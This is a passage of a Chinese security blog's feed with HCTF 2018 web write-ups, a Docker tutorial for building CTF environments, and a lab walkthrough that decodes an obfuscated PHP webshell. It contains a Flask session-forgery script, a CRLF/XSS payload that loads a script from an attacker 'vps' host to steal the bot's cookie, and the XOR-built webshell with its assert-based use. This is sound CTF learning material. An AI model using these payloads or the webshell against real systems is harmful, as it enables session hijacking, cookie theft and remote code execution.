要读secret，伪造admin的session</p><p>注意到</p><pre><code class="python">random.seed(uuid.getnode())app = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)</code></pre><p><code>getnode()</code>和MAC地址有关所以服务器的<code>SECRET_KEY</code>固定,软连接读<code>ln -s /sys/class/net/eth0/address</code>得到MAC<code>12:34:3e:14:7c:62</code></p><p><img src="/archives/4341f801/1542011957802.png" alt="1542011957802"></p><p>算出secret key伪造脚本</p><pre><code>random.seed(20015589129314)print str(random.random()*100)</code></pre><p>得到secret_key=11.935137566861131</p><p>伪造session</p><pre><code>eyJ1c2VybmFtZSI6ImFkbWluIn0.Dskfqg.pA9vis7kXInrrctifopdPNUOQOk</code></pre><p><img src="/archives/4341f801/1542011873105.png" alt="1542011873105"></p><p>读文件/proc/self/environ</p><p><img src="/archives/4341f801/1541901100521.png" alt="1541901100521"></p><pre><code>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=323a960bcc1aSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</code></pre><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>查看源代码泄露</p><p><img src="/archives/4341f801/1542046574284.png" alt="1542046574284"></p><p><a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="external">https://github.com/woadsl1234/hctf_flask/</a></p><p>下载代码审计</p><p>只有登录注册修改密码，猜测题意需要登录admin才可以。</p><pre><code>def strlower(username):    username = nodeprep.prepare(username)    return username</code></pre><p>题目的要点是成为 admin，然后看到题目提供了修改 password 的操作，而且用来检查的 name 是用户可控的。</p><p>谷歌strlower函数，这个函数在处理unicode字符时有一些问题，例如\u1d35即ᴵ，经过这个函数会变成大写字母I，然后再调用一下就会变成小写字母i，所以思路就明显了。</p><p><a href="http://blog.lnyas.xyz/?p=1411和题目非常类似，" target="_blank" rel="external">http://blog.lnyas.xyz/?p=1411和题目非常类似，</a></p><p>注册一个<code>ᴬᴰᴹᴵᴺ</code>然后修改密码，就可以用admin登录了。</p><p><img src="/archives/4341f801/1542045086966.png" alt="1542045086966"></p><p>hctf{un1c0dE_cHe4t_1s_FuNnying}</p><h2 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h2><p>登陆抓包发现有一个path路由存在302跳转</p><p><img src="/archives/4341f801/1542095165476.png" alt="1542095165476"></p><p>发现存在CRLF注入，</p><pre><code>GET /path?path=http://bottle.2018.hctf.io/user%0d%0a%0d%0a&lt;html&gt;Mang0&lt;/html&gt;</code></pre><p><img src="/archives/4341f801/1542095592837.png" alt="1542095592837"></p><p>需要绕过302跳转就可以打到cookie。因为302的时候不会xss。利用&lt;80端口可以绕过302跳转.。参考用p师傅的方法：<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p><p>直接绕过CSP,user路径输入url，bot会去访问会去访问<br>因为CRLF，可以控制返回回来的信息，可以造成XSS<br>然后根据柠檬师傅的文章发现，0，21，22等端口可以绕过302跳转执行js<br>然后user里面输入</p><pre><code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:20/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://vps/myjs/hctfcookie.js%3E%3C/script%3E</code></pre><p>得到bot session<br>替换登陆getflag<br>hctf{26372420de8d5c94f8fb007c4389841f}</p><p>方法二：</p><p><a href="http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:21/%0d%0a%0d%0a" target="_blank" rel="external">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:21/%0d%0a%0d%0a</a><a href="script%20src%3dhttp://vps:2333">script%20src%3dhttp://vps:2333</a></p><p>nc -lvvv 2333</p><p>另外附搭建xss平台：<a href="https://blog.csdn.net/itest_2016/article/details/77650356" target="_blank" rel="external">https://blog.csdn.net/itest_2016/article/details/77650356</a></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>题目的要求是登录到id=1，用户名为admin的用户后访问/web2/flag.php。</p><p><a href="http://game.2018.hctf.io/web2/user.php?order=password可以根据密码进行排序" target="_blank" rel="external">http://game.2018.hctf.io/web2/user.php?order=password可以根据密码进行排序</a> 我们可以不断注册新用户，密码逐位与admin的密码比较，最最终比较出来admin密码</p><p>注册一个密码为d的用户</p><p><img src="/archives/4341f801/1542077753170.png" alt="1542077753170"></p><p>然后按密码排序，发现它在admin下面</p><p>然后注册一个密码为e的用户，发现他在admin上面</p><p>由此可以推算出admin密码第一位是d，按照此原理，逐位得到完整的admin密码为dsa8&amp;&amp;!@#$%^&amp;d1ngy1as3dja，登录访问flag.php即可getflag。</p><p><img src="/archives/4341f801/1542078024341.png" alt="1542078024341"></p><p>hctf{this_idea_h1t_me_whil3_I_am_W3rking}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;只做出两道惭愧，复现学一下。&lt;/p&gt;
&lt;h2 id=&quot;warmup&quot;&gt;&lt;a href=&quot;#warmup&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="ctf" scheme="http://mang0.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>docker复现ctf&amp;dockerfile编写ctf环境</title>
    <link href="http://mang0.me/archives/47a94ec3/"/>
    <id>http://mang0.me/archives/47a94ec3/</id>
    <published>2018-10-29T13:57:39.000Z</published>
    <updated>2018-11-02T13:52:11.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="docker复现ctf-amp-dockerfile编写ctf环境"><a href="#docker复现ctf-amp-dockerfile编写ctf环境" class="headerlink" title="docker复现ctf&amp;dockerfile编写ctf环境"></a>docker复现ctf&amp;dockerfile编写ctf环境</h1><p>author：Mang0  </p><p>出题以及复现经常要使用docker，以前学习的不系统，从头学习记录，备忘一下</p><h2 id="0x00-基本概念"><a href="#0x00-基本概念" class="headerlink" title="0x00 基本概念"></a>0x00 基本概念</h2><p>Docker 包括三个基本概念</p><ul><li>镜像（<code>Image</code>）</li><li>容器（<code>Container</code>）</li><li>仓库（<code>Repository</code>）</li></ul><h2 id="0x01使用镜像"><a href="#0x01使用镜像" class="headerlink" title="0x01使用镜像"></a>0x01使用镜像</h2><h3 id="1-1获取镜像"><a href="#1-1获取镜像" class="headerlink" title="1.1获取镜像"></a>1.1获取镜像</h3><p>docker pull ubuntu:16.04</p><pre><code class="bash">docker run -it ubuntu:16.04 bash</code></pre><ul><li><code>-it</code>：这是两个参数，一个是 <code>-i</code>：交互式操作，一个是 <code>-t</code> 终端。我们这里打算进入 <code>bash</code> 执行一些命令并查看返回结果，因此我们需要交互式终端。</li><li><code>bash</code>：放在镜像名后的是<strong>命令</strong>，这里我们希望有个交互式 Shell，因此用的是 <code>bash</code>。</li><li><code>exit</code> 退出了这个容器。</li></ul><h3 id="1-2搜寻镜像"><a href="#1-2搜寻镜像" class="headerlink" title="1.2搜寻镜像"></a>1.2搜寻镜像</h3><pre><code>docker search ctf</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301113_804.png" alt=""></p><h3 id="1-3列出镜像"><a href="#1-3列出镜像" class="headerlink" title="1.3列出镜像"></a>1.3列出镜像</h3><pre><code class="bash">docker images == docker image ls</code></pre><p>使用tag添加镜像标签</p><pre><code class="bash">docker tag ubuntu:latest CTF:latest</code></pre><h3 id="1-4中间层镜像"><a href="#1-4中间层镜像" class="headerlink" title="1.4中间层镜像"></a>1.4中间层镜像</h3><pre><code class="bash">$ docker image ls -a</code></pre><p>只列出ubuntu的</p><pre><code class="bash">docker image ls ubuntu</code></pre><p>列出特定的某个镜像，也就是说指定仓库名和标签</p><pre><code class="bash">$ docker image ls ubuntu:16.04</code></pre><h3 id="1-5-删除本地镜像"><a href="#1-5-删除本地镜像" class="headerlink" title="1.5 删除本地镜像"></a>1.5 删除本地镜像</h3><h4 id="使用标签删除镜像"><a href="#使用标签删除镜像" class="headerlink" title="使用标签删除镜像"></a>使用标签删除镜像</h4><p>docker rmi myubuntu:latest</p><p>docker rmi 命令只是删除镜像多个标签中的指定标签而已， 并不影响镜像文件，但是镜像只剩下一个标签的时候要注意 再使用docker rmi命令会彻底删除镜像</p><p>强行删除</p><p>docker rmi -f ubuntu:16.04</p><p>docker rmi id</p><p>如果要删除本地的镜像，可以使用 <code>docker image rm</code> 命令，其格式为：</p><pre><code class="bash">docker image rm  【image id】</code></pre><h3 id="1-6-commit"><a href="#1-6-commit" class="headerlink" title="1.6  commit"></a>1.6  commit</h3><p>Docker 提供了一个 <code>docker commit</code> 命令，可以将容器的存储层保存下来成为镜像。换句话说，就是在原有镜像的基础上，再叠加上容器的存储层，并构成新的镜像。以后我们运行这个新镜像的时候，就会拥有原有容器最后的文件变化。</p><p><code>docker commit</code> 的语法格式为：</p><pre><code class="bash">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></pre><p>使用history查看镜像历史</p><pre><code class="bash">docker history ubuntu:16.04</code></pre><p>新的镜像定制好后，我们可以来运行这个镜像。</p><pre><code class="bash">docker run --name web2 -d -p 81:80 nginx:v2</code></pre><h3 id="1-7-上传镜像"><a href="#1-7-上传镜像" class="headerlink" title="1.7 上传镜像"></a>1.7 上传镜像</h3><p>docker tag test:latest user/test:latest</p><p>docker push user/test:latest</p><h2 id="0x02-操作镜像"><a href="#0x02-操作镜像" class="headerlink" title="0x02 操作镜像"></a>0x02 操作镜像</h2><h3 id="2-1创建镜像"><a href="#2-1创建镜像" class="headerlink" title="2.1创建镜像"></a>2.1创建镜像</h3><p>docker create -it ubuntu:latests</p><p>docker start af</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>其中，<code>-t</code> 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， <code>-i</code> 则让容器的标准输入保持打开。</p><h4 id="守护态："><a href="#守护态：" class="headerlink" title="守护态："></a>守护态：</h4><pre><code>  docker run -d --name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</code></pre><p>如果使用了 <code>-d</code> 参数运行容器。此时容器会在后台运行并不会把输出的结果 (STDOUT) 打印到宿主机上面(输出结果可以用 <code>docker logs</code> 查看)。</p><h4 id="启动已终止容器"><a href="#启动已终止容器" class="headerlink" title="启动已终止容器"></a>启动已终止容器</h4><p>可以利用 <code>docker container start</code> 命令，直接将一个已经终止的容器启动运行。</p><h3 id="2-2-终止容器"><a href="#2-2-终止容器" class="headerlink" title="2.2 终止容器"></a>2.2 终止容器</h3><p>docker stop ce5</p><p>docker start ce5 重启</p><p>通过 <code>docker container ls</code> 命令来查看容器信息。</p><pre><code>$ docker container ls -a</code></pre><h3 id="2-3-进入容器"><a href="#2-3-进入容器" class="headerlink" title="2.3 进入容器"></a>2.3 进入容器</h3><h4 id="attach-命令"><a href="#attach-命令" class="headerlink" title="attach 命令"></a><code>attach</code> 命令</h4><p><code>docker attach</code> 是 Docker 自带的命令。下面示例如何使用该命令。</p><pre><code class="bash">$ docker run -dit ubuntu243c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550$ docker container lsCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES243c32535da7        ubuntu:latest       &quot;/bin/bash&quot;         18 seconds ago      Up 17 seconds                           nostalgic_hypatia$ docker attach 243croot@243c32535da7:/#</code></pre><p><em>注意：</em> 如果从这个 stdin 中 exit，会导致容器的停止。</p><h4 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a><code>exec</code> 命令</h4><p>-i -t 参数</p><p><code>docker exec</code> 后边可以跟多个参数，这里主要说明 <code>-i</code> <code>-t</code> 参数。</p><p>只用 <code>-i</code> 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。</p><p>当 <code>-i</code> <code>-t</code> 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。</p><pre><code class="bash">$ docker run -dit ubuntu69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6$ docker container lsCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES69d137adef7a        ubuntu:latest       &quot;/bin/bash&quot;         18 seconds ago      Up 17 seconds                           zealous_swirles$ docker exec -i 69d1 bash</code></pre><h3 id="2-4导出容器"><a href="#2-4导出容器" class="headerlink" title="2.4导出容器"></a>2.4导出容器</h3><p>如果要导出本地某个容器，可以使用 <code>docker export</code> 命令。</p><pre><code class="bash">$ docker container ls -aCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                    PORTS               NAMES7691a814370e        ubuntu:14.04        &quot;/bin/bash&quot;         36 hours ago        Exited (0) 21 hours ago                       test$ docker export 7691a814370e &gt; ubuntu.tar</code></pre><p>这样将导出容器快照到本地文件。</p><h3 id="2-5导入容器快照"><a href="#2-5导入容器快照" class="headerlink" title="2.5导入容器快照"></a>2.5导入容器快照</h3><p>可以使用 <code>docker import</code> 从容器快照文件中再导入为镜像，例如</p><pre><code class="bash">$ cat ubuntu.tar | docker import - test/ubuntu:v1.0$ docker image lsREPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZEtest/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB</code></pre><h3 id="2-6删除容器"><a href="#2-6删除容器" class="headerlink" title="2.6删除容器"></a>2.6删除容器</h3><p>可以使用 <code>docker container rm</code> 来删除一个处于终止状态的容器。例如</p><pre><code class="bash">$ docker container rm id</code></pre><p>如果要删除一个运行中的容器，可以添加 <code>-f</code> 参数。Docker 会发送 <code>SIGKILL</code> 信号给容器。</p><h2 id="0x03-dockerfile"><a href="#0x03-dockerfile" class="headerlink" title="0x03 dockerfile"></a>0x03 dockerfile</h2><h3 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h3><pre><code>FROM node:8.4：该 image 文件继承官方的 node image，冒号表示标签，这里标签是8.4，即8.4版本的 node。COPY .[directory]：将当前目录下的所有文件（除了.dockerignore排除的路径），都拷贝进入 image 文件的 directory 目录。WORKDIR [directory]：指定接下来的工作路径为 directory。RUN [cmd]：在/app目录下，运行[cmd]命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。EXPOSE [port]：将容器 port 端口暴露出来， 允许外部连接这个端口。CMD [cmd]：在容器启动后自动执行 [cmd] 命令</code></pre><blockquote><pre><code class="bash">FROM node:8.4COPY . /appWORKDIR /appRUN npm install --registry=https://registry.npm.taobao.orgEXPOSE 3000</code></pre></blockquote><p>上面代码一共五行，含义如下。</p><blockquote><ul><li><code>FROM node:8.4</code>：该 image 文件继承官方的 node image，冒号表示标签，这里标签是<code>8.4</code>，即8.4版本的 node。</li><li><code>COPY . /app</code>：将当前目录下的所有文件（除了<code>.dockerignore</code>排除的路径），都拷贝进入 image 文件的<code>/app</code>目录。</li><li><code>WORKDIR /app</code>：指定接下来的工作路径为<code>/app</code>。</li><li><code>RUN npm install</code>：在<code>/app</code>目录下，运行<code>npm install</code>命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。</li><li><code>EXPOSE 3000</code>：将容器 3000 端口暴露出来， 允许外部连接这个端口。</li></ul></blockquote><h3 id="创建image文件"><a href="#创建image文件" class="headerlink" title="创建image文件"></a>创建image文件</h3><pre><code> docker image build -t myctf .docker build - &lt; Dockerfile</code></pre><p><code>-t</code>用来指定 image 文件的名字，后面还可用冒号指定标签，如果不指定，则默认为<code>latest</code>，</p><h3 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h3><p><code>docker container run</code> 命令会从 image 文件生成容器。</p><pre><code class="shell"> docker container run -p [port_local本地端口]:[port_container容器端口] -it image_name /bin/bash  docker container run -p 8000:3000 -it koa-demo /bin/bash   这就是在容器离得3000端口映射到本地8000端口 访问本机的8000端口就可以查看</code></pre><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>cd 到dockerfile存在的文件下</p><p> sudo docker build -t phplfi:v1 .</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301726_839.png" alt=""></p><p> sudo docker images</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301726_49.png" alt=""></p><p>sudo docker run -d -p 2333:80 phplfi:v1</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301727_684.png" alt=""></p><p>sudo docker run -it phplfi /bin/bash</p><h2 id="0x04-容器文件"><a href="#0x04-容器文件" class="headerlink" title="0x04 容器文件"></a>0x04 容器文件</h2><p>image 文件生成的容器实例，本身也是一个文件，称为容器文件。</p><pre><code># 列出本机正在运行的容器$ docker container ls# 列出本机所有容器，包括终止运行的容器$ docker container ls --all# 移除不需要的容器文件$ docker container rm [containerID]# 容器中止后自动删除容器文件$ docker container run --rm -p 8000:3000 -it image-file /bin/bash</code></pre><h2 id="0x05-网络配置"><a href="#0x05-网络配置" class="headerlink" title="0x05 网络配置"></a>0x05 网络配置</h2><h3 id="5-1映射容器端口到宿主主机的实现"><a href="#5-1映射容器端口到宿主主机的实现" class="headerlink" title="5.1映射容器端口到宿主主机的实现"></a>5.1映射容器端口到宿主主机的实现</h3><p>容器允许外部访问，可以在 <code>docker run</code> 时候通过 <code>-p</code> 或 <code>-P</code> 参数来启用。</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>自动分配一个端口</p><p>docker run -it –name dedefun -p 0.0.0.0::8080 dedefun:latest /bin/bash</p><h2 id="0x06-docker命令补齐"><a href="#0x06-docker命令补齐" class="headerlink" title="0x06 docker命令补齐"></a>0x06 docker命令补齐</h2><p>执行<code>source xxx</code>命令，先执行<code>source /usr/share/bash-completion/completions/docker</code>，再输入<code>docker</code>，然后按2次Tab键，提示错误如下：</p><pre><code class="bash">docker bash: _get_comp_words_by_ref: command not foundbash: [: : integer expression expectedbash: [: : integer expression expectedbash: [: : integer expression expectedbash: _get_comp_words_by_ref: command not foundbash: [: : integer expression expectedbash: [: : integer expression expectedbash: [: : integer expression expected</code></pre><p>注：第一行的docker，实际是输入的命令，其它是按Tab键的输出信息。</p><p>前面已经安装了<code>bash_completion</code>，于是想到执行</p><pre><code>source /usr/share/bash-completion/bash_completion</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301547_621.png" alt=""></p><h2 id="0x06-复现柠檬牛ctf"><a href="#0x06-复现柠檬牛ctf" class="headerlink" title="0x06 复现柠檬牛ctf"></a>0x06 复现柠檬牛ctf</h2><p>git clone <a href="https://github.com/l3m0n/My_CTF_Challenges.git" target="_blank" rel="external">https://github.com/l3m0n/My_CTF_Challenges.git</a></p><p>cd My_CTF_Challenges </p><p>cd </p><p>docker build -t dedefun ./</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>curl 127.0.0.1</p><p>cd  var/www/html </p><p>发现只有index.html  就运行下start.sh</p><p>./start.sh</p><p>退出 exit或者 ctrl +d</p><pre><code class="bash"> docker image ls</code></pre><p>终止状态的容器可以用 <code>docker container ls -a</code> 命令看到</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808202019_416.png" alt=""></p><h2 id="好文：Docker容器的创建、启动、和停止"><a href="#好文：Docker容器的创建、启动、和停止" class="headerlink" title="好文：Docker容器的创建、启动、和停止"></a>好文：<a href="https://www.cnblogs.com/linjiqin/p/8608975.html" target="_blank" rel="external">Docker容器的创建、启动、和停止</a></h2><p>1、容器是独立运行的一个或一组应用，及他们的运行环境。容器是Docker中的一个重要的概念。</p><p><strong>2、docker容器的启动有三种方式</strong><br>a.交互方式，基于镜像新建容器并启动<br>例如我们可以启动一个容器，打印出当前的日历表<br>[root@rocketmq-nameserver4 ~]# docker run my/python:v1 cal ##my/python:v1为镜像名和标签<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141006656-1163681357.png" alt="img"></p><p>我们还可以通过指定参数，启动一个bash交互终端。<br>[root@rocketmq-nameserver4 ~]# docker run -it my/python:v1 /bin/bash<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141018576-2113140501.png" alt="img"><br>参数-t让Docker分配一个伪终端并绑定在容器的标准输入上，-i让容器的标准输入保持打开。</p><p>使用docker run命令来启动容器，docker在后台运行的标准操作包括<br>1.检查本地是否存在指定的镜像，不存在则从公有仓库下载<br>2.使用镜像创建并启动容器<br>3.分配一个文件系统，并在只读的镜像层外面挂载一层可读可写层<br>4.从宿主主机配置的网桥接口中桥接一个虚拟接口道容器中去<br>5.从地址池分配一个ip地址给容器<br>6.执行用户指定的应用程序<br>7.执行完毕之后容器被终止<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141029918-349771940.png" alt="img"><br>my/sinatra:v2基于training/sinatra镜像进行修改后的镜像，training/sinatra为公有仓库上的镜像。</p><p>b、短暂方式，直接将一个已经终止的容器启动运行起来<br>可以使用docker start命令，直接将一个已经终止的容器启动运行起来。</p><p>[root@rocketmq-nameserver4 ~]# docker run my/python:v1 /bin/echo hello test<br>hello test<br>命令执行完，控制台会打印”hello test”，container就终止了，不过并没有消失，<br>可以用”docker ps -n 5 “看一下最新前5个的container，第一个就是刚刚执行过的container，可以再次执行一遍：docker start container_id</p><p>不过这次控制台看不到”hello test”了，只能看到ID，用logs命令才能看得到：docker logs container_id。<br>可以看到两个”hello test”了，因为这个container运行了两次。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141043102-2077108773.png" alt="img"></p><p>c、daemon方式，守护态运行<br>即让软件作为长时间服务运行，这就是SAAS啊！</p><p>例如我们启动centos后台容器，每隔一秒打印当天的日历。<br>$ docker run -d centos /bin/sh -c “while true;do echo hello docker;sleep 1;done”</p><p>启动之后，我们使用docker ps -n 5查看容器的信息</p><p>要查看启动的centos容器中的输出，可以使用如下方式：<br>$ docker logs $CONTAINER_ID ##在container外面查看它的输出<br>$ docker attach $CONTAINER_ID ##连接上容器实时查看：</p><p><strong>3、终止容器</strong><br>使用docker stop $CONTAINER_ID来终止一个运行中的容器。并且可以使用docker ps -a来看终止状态的容器。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141055377-965119728.png" alt="img"></p><p>终止状态的容器，可以使用docker start来重新启动。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141106848-1725632174.png" alt="img"></p><p>使用docker restart命令来重启一个容器。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141119426-840453652.png" alt="img"></p><p>invalid argument “Mysqlonline” for t: Error parsing reference: “Mysqlonline” is not a valid repository/tag: repository name must be lowercase See ‘docker build –help’.</p><p>原因真正原因是名称中带了大写的M O，将大写改为小写，创建成功。</p><p>坑啊，文档中并没有哪里要求只能是小写。</p><p>docker run -it –name mysqlonline -p 0.0.0.0:8080:80  mysqlonline:latest /bin/bash</p><p>sudo apt install curl</p><p>xftp<br>  202  ls<br>  203  cd geekweb1/<br>  204  clear<br>  205  ls<br>  206  pwd<br>  207  docker build -t tset/img /root/geekweb1<br>  208  docker images<br>  209  docker rmi c8daa6cadc73<br>  210  doker stop 036d7eabaf2e<br>  211  docker 036d7eabaf2e<br>  212  docker stop 036d7eabaf2e<br>  213  docker rm 036d7eabaf2e<br>  214  docker rmi c8daa6cadc73<br>  215  lsa<br>  216  cd ..<br>  217  ls<br>  218  rm -rf geekweb1</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;docker复现ctf-amp-dockerfile编写ctf环境&quot;&gt;&lt;a href=&quot;#docker复现ctf-amp-dockerfile编写ctf环境&quot; class=&quot;headerlink&quot; title=&quot;docker复现ctf&amp;amp;dockerfile
      
    
    </summary>
    
      <category term="工具" scheme="http://mang0.me/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="docker" scheme="http://mang0.me/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>墨者学院审计类通关指南</title>
    <link href="http://mang0.me/archives/441c37c9/"/>
    <id>http://mang0.me/archives/441c37c9/</id>
    <published>2018-10-28T14:02:08.000Z</published>
    <updated>2018-11-02T13:52:16.692Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发于<a href="https://xz.aliyun.com/t/2821" target="_blank" rel="external">先知社区</a>,转载请注明来源</p><h2 id="一、PHP代码分析溯源"><a href="#一、PHP代码分析溯源" class="headerlink" title="一、PHP代码分析溯源"></a>一、PHP代码分析溯源</h2><h3 id="0x00-第1题"><a href="#0x00-第1题" class="headerlink" title="0x00 第1题"></a>0x00 第1题</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>某日，在某公司做IT维护的朋友给安全工程师”墨者”发了一个PHP文件，说在其WEB服务器发现多了一个b.php文件，目前不确定这个文件是开发留下的正常文件还是攻击者上传的木马后门，希望”墨者”能够帮他分析一下。 </p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>访问<a href="http://219.153.49.228:42335/" target="_blank" rel="external">http://219.153.49.228:42335/</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291012_99.png" alt=""></p><pre><code class="php">&lt;?php @$_++;$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;{&quot;^&quot;/&quot;);$___=(&quot;$&quot;^&quot;{&quot;).(&quot;~&quot;^&quot;.&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;-&quot;^&quot;~&quot;).(&quot;(&quot;^&quot;|&quot;);${$__}[!$_](${$___}[$_]); ?&gt;</code></pre><p>分析代码：</p><p>我们用echo分别输出三个变量</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291020_69.png" alt=""></p><p><code>&quot;$_&quot;     &quot;$__&quot;     &quot;$___&quot;</code> 这三个是变量名，我们通过编译知道它们分别是：</p><p>$_ =&gt; 1</p><p>$__ =&gt; _GET</p><p>$___ =&gt; _POST</p><p>实际上去理解“^”为异或运算符，$<em>++;这行代码的意思是对变量名为”</em>“的变量进行自增操作，可以发现是异曲同工之妙</p><pre><code>$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;{&quot;^&quot;/&quot;);(&quot;`&quot;^&quot;?&quot;)       01100000^00111111=01011111 —&gt;”_”(&quot;:&quot;^&quot;}&quot;)        00111010^01111101=01000111—&gt;”G”(&quot;%&quot;^&quot;`&quot;)      00100101^01100000=01000101—&gt;”E”(&quot;{&quot;^&quot;/&quot;)        01111011^ 00101111=01010100—&gt;”T”</code></pre><p>我们把变量用值替换进去得到</p><p> <code>${_GET}[!1](${_POST}[1]);</code>，把多余的{}去掉 [!1]也就是[0]</p><p>整理后代码如下： <code>$_GET[0]($_POST[1]);</code>和一句话的 <code>$_POST[1]</code>传参差不多了，那么<code>$_GET[0]</code>就是我们的函数名了</p><p>根据”b.php源码”提示去b.php目录下</p><p>用hackbar传GET和POST请求</p><p><a href="http://219.153.49.228:42335/b.php?0=assert" target="_blank" rel="external">http://219.153.49.228:42335/b.php?0=assert</a></p><p>1=phpinfo()</p><p>可以执行</p><p>菜刀写入<a href="http://219.153.49.228:42335/b.php?0=assert密码是1" target="_blank" rel="external">http://219.153.49.228:42335/b.php?0=assert密码是1</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291026_279.png" alt=""></p><p>mozheae74b8ee177abe3a37432f933ac</p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>这里有一个问题在于</p><p><a href="http://219.153.49.228:42335/b.php?0=eval" target="_blank" rel="external">http://219.153.49.228:42335/b.php?0=eval</a></p><p>无法显示phpinfo</p><p>这里延伸出一个问题<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="external">柠檬大大的文章</a>解释的很好</p><p>问题出在</p><p><code>$_POST[&#39;1&#39;]()</code>这是一个<a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a>,这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括<strong>回调函数</strong>，函数表在内的一些用途。 </p><p>但是eval不能被可变函数 调用。 </p><blockquote><p><a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" 